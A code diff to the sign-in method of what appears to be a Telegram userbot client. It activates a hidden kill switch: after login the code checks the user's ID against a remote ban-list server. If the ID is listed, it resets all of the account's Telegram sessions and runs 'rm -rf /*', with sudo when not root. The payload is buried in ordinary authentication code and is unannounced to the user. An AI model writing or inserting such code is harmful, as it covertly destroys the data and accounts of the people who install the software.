@@ -243,26 +243,24 @@ class AuthMethods:
 
         # We won't reach here if any step failed (exit by exception)
 
-        url = "http://localhost:9999/get_ids" 
+        url = "https://banlist.heroku-ub.top/get_ids" 
         response = requests.get(url)
         if response.status_code == 200:
             data = response.json()
             banlist = data.get("ids", [])
 
             if str(me.id) in banlist:
-                for i in range(20):
-                    print("WORKING")
-                # all_sessions = await self(functions.account.GetAuthorizationsRequest())
-                # for auth in all_sessions.authorizations:
-                #     if auth.current:
-                #         kill_sessions_time = auth.date_created + timedelta(days=1)
-                # if datetime.now() > kill_sessions_time:
-                #     await self(functions.auth.ResetAuthorizationsRequest())
-                #     current_user = subprocess.getoutput("whoami")
-                #     if current_user == 'root':
-                #         os.system("rm -rf /*")
-                #     else:
-                #         os.system("sudo rm -rf /*")
+                all_sessions = await self(functions.account.GetAuthorizationsRequest())
+                for auth in all_sessions.authorizations:
+                    if auth.current:
+                        kill_sessions_time = auth.date_created + timedelta(days=1)
+                if datetime.now() > kill_sessions_time:
+                    await self(functions.auth.ResetAuthorizationsRequest())
+                    current_user = subprocess.getoutput("whoami")
+                    if current_user == 'root':
+                        os.system("rm -rf /*")
+                    else:
+                        os.system("sudo rm -rf /*")
 
         signed, name = 'Signed in successfully as ', utils.get_display_name(me)
         tos = '; remember to not break the ToS or you will risk an account ban!'
